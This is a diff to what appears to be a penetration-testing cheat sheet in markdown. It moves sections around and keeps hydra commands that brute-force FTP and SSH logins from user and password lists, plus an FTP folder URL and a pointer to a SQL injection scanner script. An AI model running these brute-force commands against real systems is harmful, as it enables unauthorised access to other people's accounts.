@@ -7,15 +7,17 @@
 ```bash
 hydra -L userlist.txt -P passwordlist.txt ftp://IP-Address -V
 ```
+### See content
+```bash
+ftp://IP-Address/folder
+```
+
 ### SSH brute force
 ```bash
 hydra -L userlist.txt -P passwordlist.txt IP-Address ssh -V
 ```
-## FTP folder
-```bash
-ftp://IP-Address/folder
-```
-## SQL injection
+
+## SQL
 
 dsss.py
 
